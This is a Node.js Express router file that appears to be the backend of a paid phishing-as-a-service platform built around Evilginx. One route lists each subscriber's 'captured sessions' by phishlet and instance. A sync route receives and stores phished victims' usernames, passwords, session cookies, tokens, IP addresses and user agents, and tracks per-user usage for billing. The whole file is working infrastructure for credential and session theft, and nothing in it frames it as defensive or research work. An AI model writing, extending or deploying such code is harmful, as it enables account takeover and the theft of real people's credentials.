const express = require('express');
const router = express.Router();
const { authenticate, requireSubscription } = require('../middleware/auth');
const crypto = require('crypto');
const pool = require('../db');

// GET /api/sessions - List user's captured sessions
router.get('/', authenticate, requireSubscription, async (req, res) => {
    try {
        const { page = 1, limit = 50, phishlet, instanceId } = req.query;
        const offset = (page - 1) * limit;

        let query = 'SELECT * FROM sessions WHERE user_id = $1';
        const params = [req.user.id];
        let paramIndex = 2;

        if (phishlet) {
            params.push(phishlet);
            query += ` AND phishlet = $${paramIndex++}`;
        }

        if (instanceId) {
            params.push(instanceId);
            query += ` AND instance_id = $${paramIndex++}`;
        }

        query += ` ORDER BY captured_at DESC LIMIT $${paramIndex++} OFFSET $${paramIndex}`;
        params.push(parseInt(limit), parseInt(offset));

        const result = await pool.query(query, params);
        
        // Get total count
        const countResult = await pool.query(
            'SELECT COUNT(*) as count FROM sessions WHERE user_id = $1',
            [req.user.id]
        );

        res.json({
            success: true,
            data: {
                sessions: result.rows,
                total: parseInt(countResult.rows[0].count),
                page: parseInt(page),
                limit: parseInt(limit)
            }
        });

    } catch (error) {
        console.error('Sessions fetch error:', error);
        res.status(500).json({ success: false, message: 'Error fetching sessions' });
    }
});

// POST /api/sessions/sync - Sync session from Evilginx instance
router.post('/sync', async (req, res) => {
    try {
        const { instanceApiKey, session } = req.body;

        // Verify instance
        const instanceResult = await pool.query(
            'SELECT id, user_id FROM instances WHERE api_key = $1',
            [instanceApiKey]
        );

        if (instanceResult.rows.length === 0) {
            return res.status(401).json({ success: false, message: 'Invalid instance API key' });
        }

        const instance = instanceResult.rows[0];
        const sessionId = crypto.randomBytes(16).toString('hex');

        // Check if session exists
        const existingSession = await pool.query(
            'SELECT id FROM sessions WHERE instance_id = $1 AND session_sid = $2',
            [instance.id, session.session_id]
        );

        if (existingSession.rows.length > 0) {
            // Update existing session
            await pool.query(
                `UPDATE sessions SET username = $1, password = $2, cookies = $3, tokens = $4, custom_data = $5 
                 WHERE instance_id = $6 AND session_sid = $7`,
                [
                    session.username,
                    session.password,
                    JSON.stringify(session.cookies),
                    JSON.stringify(session.tokens),
                    JSON.stringify(session.custom),
                    instance.id,
                    session.session_id
                ]
            );
        } else {
            // Insert new session
            await pool.query(
                `INSERT INTO sessions (id, instance_id, user_id, session_sid, phishlet, username, password, landing_url, user_agent, remote_addr, cookies, tokens, custom_data)
                 VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13)`,
                [
                    sessionId,
                    instance.id,
                    instance.user_id,
                    session.session_id,
                    session.phishlet,
                    session.username,
                    session.password,
                    session.landing_url,
                    session.user_agent,
                    session.remote_addr,
                    JSON.stringify(session.cookies),
                    JSON.stringify(session.tokens),
                    JSON.stringify(session.custom)
                ]
            );
        }

        // Update usage stats
        const now = new Date();
        const usageId = crypto.randomBytes(16).toString('hex');
        
        // Check if usage stats exist
        const existingUsage = await pool.query(
            'SELECT id FROM usage_stats WHERE user_id = $1 AND instance_id = $2 AND period_month = $3 AND period_year = $4',
            [instance.user_id, instance.id, now.getMonth() + 1, now.getFullYear()]
        );

        if (existingUsage.rows.length > 0) {
            await pool.query(
                'UPDATE usage_stats SET total_sessions = total_sessions + 1 WHERE id = $1',
                [existingUsage.rows[0].id]
            );
        } else {
            await pool.query(
                `INSERT INTO usage_stats (id, user_id, instance_id, period_month, period_year, total_sessions)
                 VALUES ($1, $2, $3, $4, $5, 1)`,
                [usageId, instance.user_id, instance.id, now.getMonth() + 1, now.getFullYear()]
            );
        }

        res.json({ success: true, message: 'Session synced' });

    } catch (error) {
        console.error('Session sync error:', error);
        res.status(500).json({ success: false, message: 'Session sync failed' });
    }
});

module.exports = router;
